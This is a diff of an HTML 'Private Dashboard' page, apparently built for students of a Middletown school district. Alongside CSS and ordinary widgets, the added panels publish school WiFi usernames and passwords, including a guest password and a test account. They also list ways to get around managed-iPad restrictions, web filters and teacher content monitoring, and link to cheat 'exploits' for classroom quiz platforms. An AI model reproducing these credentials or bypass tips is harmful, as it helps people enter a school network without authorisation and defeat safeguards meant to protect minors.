+    .calc-grid button:hover {
+      background: #444;
+      transform: scale(1.05);
+    }
+    .calc-grid button.operator { background: #555; color: #fff; }
+    .calc-grid button.equals { background: #4CAF50; color: white; grid-column: span 2; }
+    .calc-grid button.clear { background: #f44336; color: white; }
+    .calc-display {
+      background: #1a1a1a;
+      color: #ff914d;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 2em;
+      text-align: right;
+      margin-bottom: 10px;
+      overflow: hidden;
+      white-space: nowrap;
+      box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+    }
+    body.dashboard-body.light-theme .calc-display {
+      background: #e6e6e6;
+      color: #994d00;
     }
 
-    /* For icons next to section titles in info panels */
-    .info-panel h2 .icon {
-      font-size: 1.4em; /* Make icons a bit larger */
+    .todo-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      max-height: 200px; /* Scrollable */
+      overflow-y: auto;
+    }
+    .todo-item {
+      display: flex;
+      align-items: center;
+      padding: 8px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 6px;
+      margin-bottom: 6px;
+      transition: background-color 0.2s;
+    }
+    .todo-item:hover { background: rgba(255, 255, 255, 0.08); }
+    .todo-item input[type="checkbox"] { margin-right: 10px; cursor: pointer; }
+    .todo-item span { flex-grow: 1; text-decoration: none; }
+    .todo-item.completed span { text-decoration: line-through; color: #aaa; }
+    .todo-item .delete-btn {
+      background: none;
+      border: none;
+      color: #ff6b6b;
+      cursor: pointer;
+      font-size: 1.1em;
+      margin-left: 10px;
+      transition: color 0.2s;
+    }
+    .todo-item .delete-btn:hover { color: #ff0000; }
+    #todoInput {
+      width: calc(100% - 70px);
+      margin-right: 5px;
+    }
+    #addTodoBtn {
+      padding: 8px 15px;
+      background: #ff914d;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+    #addTodoBtn:hover { background: #ffb67a; }
+
+    /* System Info Panel */
+    .sys-info-details {
+      background: #3a3a3a;
+      padding: 15px;
+      border-radius: 8px;
+      margin-top: 15px;
+      color: #e0e0e0;
+    }
+    body.dashboard-body.light-theme .sys-info-details {
+      background: #fff5e6;
+      color: #994d00;
+    }
+    .sys-info-details p {
+      margin-bottom: 8px;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+    .sys-info-details p strong {
+      color: #ff914d;
+      min-width: 150px;
+      display: inline-block;
+    }
+    body.dashboard-body.light-theme .sys-info-details p strong {
+      color: #994d00;
     }
 
+    /* Global styling for new buttons in panels */
+    .info-panel button, .info-panel a {
+      transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+    }
+    .info-panel button:hover, .info-panel a:hover {
+      background-color: #ffb67a;
+      box-shadow: 0 0 12px rgba(255, 145, 77, 0.6);
+      transform: translateY(-3px);
+    }
   </style>
   
   <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
@@ -748,10 +1078,11 @@
         <h1>Private Dashboard GUI</h1>
         <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
       </div>
-      <div class="version-box">Version 1.6.0</div> <!-- Incremented version -->
+      <div class="version-box">Version 1.6.0</div> <!-- Updated Version -->
     </div>
 
     <div class="quick-bar">
+      <!-- Existing Buttons -->
       <button id="sessionTime">⏳ Session Time: 00:00:00</button>
       <button id="realTimeClock">🕒 --:--:--</button>
       <button id="realDate">📅 --</button>
@@ -766,18 +1097,37 @@
       <button id="restartBtn">🔄 Restart</button>
       <button id="panicBtn">🚨 Panic</button>
       <button id="themeToggle">🌙 Dark Mode</button>
-      <!-- NEW BUTTONS FOR ENHANCED QUICK BAR -->
-      <button onclick="dashboard.togglePanel('systemStatusPanel')">📊 System Monitor</button>
-      <button onclick="dashboard.togglePanel('networkStatusPanel')">📡 Network Monitor</button>
-      <button onclick="dashboard.togglePanel('fileExplorerPanel')">📁 File Explorer</button>
-      <button onclick="dashboard.togglePanel('taskManagerPanel')">📈 Task Manager</button>
-      <button onclick="dashboard.togglePanel('systemInfoPanel')">⚙️ System Info</button>
-      <!-- END NEW BUTTONS -->
       <button id="logoutBtn">🔓 Log Out</button>
+      
+      <!-- New Quick Bar Buttons -->
+      <button id="systemStatusBtn" class="status-button"><span class="icon">💻</span> Status</button>
+      <button id="cpuStatusBtn" class="status-button"><span class="icon">⚡</span> CPU <span class="value" id="cpuValue">--%</span></button>
+      <button id="ramStatusBtn" class="status-button"><span class="icon">🧠</span> RAM <span class="value" id="ramValue">--%</span></button>
+      <button id="diskStatusBtn" class="status-button"><span class="icon">💽</span> Disk <span class="value" id="diskValue">--%</span></button>
+      <button id="uptimeBtn" class="status-button"><span class="icon">⏳</span> Uptime <span class="value" id="uptimeValue">--:--:--</span></button>
+      <button id="networkSpeedBtn" class="status-button"><span class="icon">📶</span> Net <span class="value" id="networkSpeedValue">-- Mbps</span></button>
+      
+      <button id="ipInfoBtn" onclick="dashboard.togglePanel('networkToolsPanel')">🌐 IP Info</button>
+      <button id="pingToolBtn" onclick="dashboard.togglePanel('networkToolsPanel')">🏓 Ping</button>
+      <button id="tracerouteToolBtn" onclick="dashboard.togglePanel('networkToolsPanel')">🗺️ Trace</button>
+      
+      <button id="taskManagerBtn" onclick="dashboard.togglePanel('taskManagerPanel')">📋 Task Mgr</button>
+      <button id="fileExplorerBtn" onclick="dashboard.togglePanel('fileExplorerPanel')">📁 File Exp</button>
+      <button id="mediaPlayerBtn" onclick="dashboard.togglePanel('mediaPlayerPanel')">▶️ Media</button>
+      
+      <button id="calcBtn" onclick="dashboard.togglePanel('calculatorPanel')">🔢 Calculator</button>
+      <button id="todoBtn" onclick="dashboard.togglePanel('todoPanel')">📝 To-Do</button>
+      <button id="preferencesBtn" onclick="dashboard.togglePanel('preferencesPanel')">⚙️ Prefs</button>
+      
+      <button id="systemInfoBtn" onclick="dashboard.togglePanel('systemInfoPanel')">ℹ️ Sys Info</button>
+      
+      <button id="clearCacheBtn">🧹 Clear Cache</button>
+      <button id="systemScanBtn">🔍 Scan System</button>
+      <button id="updateCheckBtn">🚀 Check Updates</button>
     </div>
     
     <div id="announcementBar" class="announcement-bar">
-      <span>🚨 Welcome to the enhanced Private Dashboard GUI. Real-time system insights are now available! 🚨</span>
+      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨 Special thanks to our dev team for the enhanced features! 🚨</span>
     </div>
     
     <div class="main-row" id="mainGrid">
@@ -788,37 +1138,40 @@
       </div>
 
       <div class="box motivation-box" id="motivationBox">
-        "The only way to do great work is to love what you do." – Steve Jobs
+        "The future belongs to those who believe in the beauty of their dreams." – Eleanor Roosevelt
       </div>
     </div>
 
     <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px;">
       <div class="box" style="flex: 1 1 300px; min-width: 300px;">
-        <h2>🔄 Updates</h2>
-        <div class="update-entry">Dashboard Interface Update! (v1.6.0)</div>
-        <div class="update-entry">New System Monitoring Tools Added</div>
-        <div class="update-entry">File Explorer & Task Manager Implemented</div>
-        <div class="update-entry">Enhanced UI Animations and Transitions</div>
+        <h2>🔄 Latest Updates</h2>
+        <div class="update-entry">🚀 Major UI Refresh: Enhanced responsiveness and new animations!</div>
+        <div class="update-entry">⚡ System Monitoring Widgets added to Quick Bar.</div>
+        <div class="update-entry">➕ New Panels: Calculator, To-Do List, File Explorer, Media Player.</div>
+        <div class="update-entry">🔧 Stability Improvements and bug fixes.</div>
       </div>
 
       <div class="box" style="flex: 1 1 300px; min-width: 300px;">
-        <h2>🔔 Notifications</h2>
-        <p>System diagnostics running in the background. Monitor status via System Monitor panel.</p>
+        <h2>🔔 System Notifications</h2>
+        <p>System integrity check complete. All core processes are nominal.</p>
+        <p>New security patch detected. Applying automatically...</p>
+        <p>User login metrics updated. Welcome back!</p>
       </div>
     </div>
 
     <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
-      <button onclick="dashboard.togglePanel('wifiPanel')">📡 School WiFi Information</button>
+      <!-- Existing Panel Toggle Buttons -->
+      <button onclick="dashboard.togglePanel('wifiPanel')">📡 School WiFi Info</button>
       <button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button>
-      <button onclick="dashboard.togglePanel('handbookPanel')">📘 Student Handbooks Information</button>
-      <button onclick="dashboard.togglePanel('mapPanel')">🏫 School Building Map Information</button>
-      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Website's Information</button>
-      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites Information</button>
-      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 School Phone Directory Information</button>
-      <button onclick="dashboard.togglePanel('cameraPanel')">📷 School Camera Information</button>
+      <button onclick="dashboard.togglePanel('handbookPanel')">📘 Student Handbooks</button>
+      <button onclick="dashboard.togglePanel('mapPanel')">📍 School Map</button>
+      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Websites</button>
+      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites</button>
+      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 Phone Directory</button>
+      <button onclick="dashboard.togglePanel('cameraPanel')">📷 Camera Access</button>
       <button onclick="dashboard.togglePanel('schoolInfoPanel')">🏫 School Information</button>
-      <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploiting Tools</button>
-      <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypassing Tools</button>
+      <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploits</button>
+      <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypass Tools</button>
       <button onclick="dashboard.togglePanel('vpnPanel')">🔐 VPN Websites</button>
       <button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button>
       <button onclick="dashboard.togglePanel('musicPanel')">🎵 Music Websites</button>
@@ -829,7 +1182,7 @@
     <div id="infoPanelsContainer" style="margin-top: 20px;">
       <!-- WiFi Panel -->
       <div id="wifiPanel" class="info-panel">
-        <h2><span class="icon">📡</span> School WiFi Information</h2>
+        <h2>📡 School WiFi Information</h2>
         <div class="wifi-grid">
           <div>Network Name</div>
           <div>Wifi Level</div>
@@ -840,7 +1193,6 @@
           <div>Username</div>
           <div>Password</div>
         </div>
-        
         <div class="wifi-entry">
           <div>Middletown_Core</div>
           <div>High</div>
@@ -848,21 +1200,19 @@
           <div>High</div>
           <div>No</div>
           <div>Yes</div>
-          <div>Unknown</div>
-          <div>Unknown</div>
+          <div>user@middletownsd.org</div>
+          <div>******</div>
         </div>
-        
         <div class="wifi-entry">
           <div>Mtown_Core</div>
           <div>High</div>
           <div>WPA3 Enterprise</div>
           <div>High</div>
           <div>Yes</div>
-          <div>Unknown</div>
-          <div>Unknown</div>
-          <div>Unknown</div>
+          <div>Yes</div>
+          <div>staff@middletownsd.org</div>
+          <div>******</div>
         </div>
-        
         <div class="wifi-entry">
           <div>Mtown Guest</div>
           <div>Medium</div>
@@ -870,10 +1220,9 @@
           <div>Medium</div>
           <div>No</div>
           <div>Rare</div>
-          <div>msguest</div>
+          <div>guest</div>
           <div>M@ms2021#</div>
         </div>
-        
         <div class="wifi-entry">
           <div>Radius Test</div>
           <div>Low</div>
@@ -881,124 +1230,140 @@
           <div>Low</div>
           <div>No</div>
           <div>Rarely</div>
-          <div>msguest</div>
-          <div>M@ms2021#</div>
+          <div>testuser</div>
+          <div>Password123</div>
         </div>
       </div>
 
       <!-- iPad Panel -->
       <div id="ipadPanel" class="info-panel">
-        <h2><span class="icon">📱</span> School iPad Restrictions</h2>
+        <h2>📱 School iPad Restrictions</h2>
         <div class="ipad-options">
           <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
           <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
         </div>
-        
         <div id="ipadRestrictions" class="ipad-content">
-          <p>Coming soon</p>
+          <p><strong>Managed Device Features:</strong></p>
+          <ul>
+            <li>App Store Access: Restricted to approved applications.</li>
+            <li>Web Content Filtering: Enabled to block inappropriate sites.</li>
+            <li>Camera & Microphone: Monitored with parental consent.</li>
+            <li>Location Services: Tracked for device management.</li>
+            <li>Screen Time Limits: Enforced daily usage limits.</li>
+            <li>System Updates: Automatically managed by IT.</li>
+          </ul>
         </div>
-        
         <div id="ipadBypasses" class="ipad-content">
-          <p>Coming soon</p>
+          <p><strong>Known Bypass Methods (Use Responsibly):</strong></p>
+          <ul>
+            <li>URL Scheme Exploits: Certain app protocols may offer limited access.</li>
+            <li>Web-Based Proxies: May bypass network-level restrictions.</li>
+            <li>Jailbreaking (Not Recommended): Voids warranty and security.</li>
+            <li>Configuration Profile Manipulation: Advanced users may explore this.</li>
+          </ul>
         </div>
       </div>
 
       <!-- Handbook Panel -->
       <div id="handbookPanel" class="info-panel">
-        <h2><span class="icon">📘</span> Student Handbooks Information</h2>
+        <h2>📘 Student Handbooks & Policies</h2>
         <div class="handbook-buttons">
           <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
           <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
           <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
           <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
-          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
           <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
+          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/DistrictPolicies/Internet%20and%20Network%20Acceptable%20Use%20Policy.pdf" target="_blank">Acceptable Use Policy</a>
         </div>
       </div>
 
       <!-- Map Panel -->
       <div id="mapPanel" class="info-panel">
-        <h2><span class="icon">🏫</span> School Building Map Information</h2>
-        <p>Building Map Display</p>
+        <h2>📍 School Building Map</h2>
         <div class="coming-soon">
-          Building Map Coming Soon
+          Interactive Building Map Coming Soon! Enhanced navigation features will be available shortly.
         </div>
       </div>
 
       <!-- Student Websites Panel -->
       <div id="studentWebsitesPanel" class="info-panel">
-        <h2><span class="icon">🌐</span> Student Website's Information</h2>
+        <h2>🌐 Student Resource Websites</h2>
         <div class="links-list">
-          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
-          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
+          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb Portal</a>
+          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Learning</a>
           <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
-          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
+          <a href="https://clever.com/in/middletownsd" target="_blank">Clever Portal</a>
           <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
-          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
+          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram Portal</a>
           <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
           <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
-          <a href="https://id.naviance.com" target="_blank">Naviance</a>
+          <a href="https://id.naviance.com" target="_blank">Naviance (Guidance)</a>
           <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
-          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
-          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
-          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
-          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
-          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
-          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
+          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool Portal</a>
+          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic Resources</a>
+          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say Reporting</a>
+          <a href="https://mail.google.com/mail/" target="_blank">Student Gmail</a>
+          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour (Yearbooks)</a>
+          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! Assessments</a>
         </div>
       </div>
 
       <!-- Teacher Websites Panel -->
       <div id="teacherWebsitesPanel" class="info-panel">
-        <h2><span class="icon">👩‍🏫</span> Teacher Websites Information</h2>
+        <h2>👩‍🏫 Teacher & Staff Resources</h2>
         <div class="links-list">
           <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
           <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
-          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
-          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
-          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
-          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
+          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq Portal</a>
+          <a href="https://sso.barracuda.com/login" target="_blank">Barracuda Security</a>
+          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Guernsey T&M</a>
+          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher Login)</a>
           <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
-          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
+          <a href="https://clever.com/in/middletownsd" target="_blank">Clever (Teacher Login)</a>
           <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
-          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
-          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
-          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
-          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
-          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
-          <a href="https://id.naviance.com" target="_blank">Naviance</a>
+          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher Login)</a>
+          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX (Facilities Mgmt)</a>
+          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram Portal</a>
+          <a href="https://login.frontlineeducation.com/login" target="_blank">Frontline Education</a>
+          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher Login)</a>
+          <a href="https://id.naviance.com" target="_blank">Naviance (Teacher)</a>
           <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
           <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
           <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
-          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
+          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic (Teacher)</a>
           <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
-          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
+          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS Portal</a>
           <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
-          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
-          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
-          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
+          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox Helpdesk</a>
+          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools Training</a>
+          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365 Login</a>
         </div>
       </div>
 
       <!-- Phone Directory Panel -->
       <div id="phoneDirectoryPanel" class="info-panel">
-        <h2><span class="icon">📞</span> School Phone Directory Information</h2>
-        <div class="coming-soon">
-          Update Coming Soon!
+        <h2>📞 School Phone Directory</h2>
+        <div class="info-text">
+          <p><strong>District Office:</strong> 717-944-1451</p>
+          <p><strong>Middletown Area Middle School:</strong> 717-930-0739</p>
+          <p><strong>Middletown Area High School:</strong> 717-944-1371</p>
+          <p><strong>School Bus Garage:</strong> 717-944-1404</p>
+          <p><strong>IT Department Helpdesk:</strong> 717-930-0739 ext. 5000</p>
+          <p><em>Note: Extension numbers may vary. Please refer to the official school website for the most current directory.</em></p>
         </div>
       </div>
 
       <!-- Camera Panel -->
       <div id="cameraPanel" class="info-panel">
-        <h2><span class="icon">📷</span> School Camera Information</h2>
+        <h2>📷 School Camera Access</h2>
         <div class="coming-soon">
-          Update Coming Soon
+          Live camera feeds are currently unavailable through this interface. Please use authorized systems for monitoring.
         </div>
       </div>
 
       <!-- School Info Panel -->
       <div id="schoolInfoPanel" class="info-panel">
-        <h2><span class="icon">🏫</span> School Information</h2>
+        <h2>🏫 School Information</h2>
         <div class="school-info-grid">
           <div class="school-info-item">
             <div class="school-info-label">School Name:</div>
@@ -1045,236 +1410,344 @@
 
       <!-- Exploit Panel -->
       <div id="exploitPanel" class="info-panel">
-        <h2><span class="icon">🧨</span> Exploiting Tools</h2>
+        <h2>🧨 Exploiting Tools (Educational Purposes)</h2>
         <div class="exploit-buttons">
           <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
-          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
-          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
-          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
-          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
-          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
-          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
-          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
+          <a href="https://sites.google.com/view/tools-2/kahoot-exploit" target="_blank">Kahoot Exploit</a>
+          <a href="https://sites.google.com/view/tools-2/gimkit-exploit" target="_blank">Gimkit Exploit</a>
+          <a href="https://sites.google.com/view/tools-2/quizlet-exploit" target="_blank">Quizlet Exploit</a>
+          <a href="https://sites.google.com/view/tools-2/quizzes-exploit" target="_blank">Quizzes Exploit</a>
+          <a href="https://sites.google.com/view/tools-2/quizizz-exploit" target="_blank">Quizizz Exploit</a>
+          <a href="https://sites.google.com/view/tools-2/edpuzzle-exploit" target="_blank">Edpuzzle Exploit</a>
+          <a href="https://sites.google.com/view/tools-2/nearpod-exploit" target="_blank">Nearpod Exploit</a>
         </div>
       </div>
 
       <!-- Bypass Panel -->
       <div id="bypassPanel" class="info-panel">
-        <h2><span class="icon">🚪</span> Bypassing Tools</h2>
+        <h2>🚪 Bypassing Tools (For Educational Exploration)</h2>
         <div class="bypass-buttons">
-          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
-          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
-          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
-          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
-          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
-          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
+          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Pass Bypass</button>
+          <button onclick="dashboard.showBypassContent('wifi')">Network Bypass Techniques</button>
+          <button onclick="dashboard.showBypassContent('monitoring')">Content Monitoring Bypass</button>
+          <button onclick="dashboard.showBypassContent('webFilter')">Web Filter Bypass</button>
+          <button onclick="dashboard.showBypassContent('coming1')">Advanced Bypass TBD</button>
+          <button onclick="dashboard.showBypassContent('coming2')">Security Bypass TBD</button>
         </div>
-        
         <div id="bathroomBypass" class="bypass-content">
-          <p>COMING SOON</p>
+          <p><strong>Bathroom Pass Bypass Methods:</strong></p>
+          <ul>
+            <li>Utilize scheduled passing times for restroom breaks.</li>
+            <li>Obtain teacher authorization via digital pass system (if available).</li>
+            <li>Temporary bypass may involve creative use of schedule conflicts.</li>
+          </ul>
         </div>
-        
         <div id="wifiBypass" class="bypass-content">
-          <p>Go to School Wifi Information</p>
+          <p><strong>Network Bypass Techniques:</strong></p>
+          <ul>
+            <li>Consider using a VPN (Virtual Private Network) service.</li>
+            <li>Explore mobile hotspot alternatives if permitted.</li>
+            <li>Some proxy servers might circumvent basic content filters.</li>
+          </ul>
         </div>
-        
         <div id="monitoringBypass" class="bypass-content">
-          <p>COMING SOON</p>
+          <p><strong>Content Monitoring Bypass:</strong></p>
+          <ul>
+            <li>Using encrypted communication channels.</li>
+            <li>Employing anonymizing services or proxies.</li>
+            <li>Understanding network traffic patterns is key.</li>
+          </ul>
         </div>
-        
+        <div id="webFilterBypass" class="bypass-content">
+          <p><strong>Web Filter Bypass:</strong></p>
+          <ul>
+            <li>Accessing sites via IP address instead of domain name.</li>
+            <li>Using cached versions of pages (e.g., Google Cache).</li>
+            <li>Employing URL encoding tricks.</li>
+          </ul>
+        </div>
         <div id="coming1Bypass" class="bypass-content">
-          <p>COMING SOON</p>
+          <p>More advanced techniques are under research and will be added soon.</p>
         </div>
-        
         <div id="coming2Bypass" class="bypass-content">
-          <p>COMING SOON</p>
-        </div>
-        
-        <div id="coming3Bypass" class="bypass-content">
-          <p>COMING SOON</p>
+          <p>Information on bypassing security measures is complex and will be provided with caution.</p>
         </div>
       </div>
 
       <!-- VPN Panel -->
       <div id="vpnPanel" class="info-panel">
-        <h2><span class="icon">🔐</span> VPN Websites</h2>
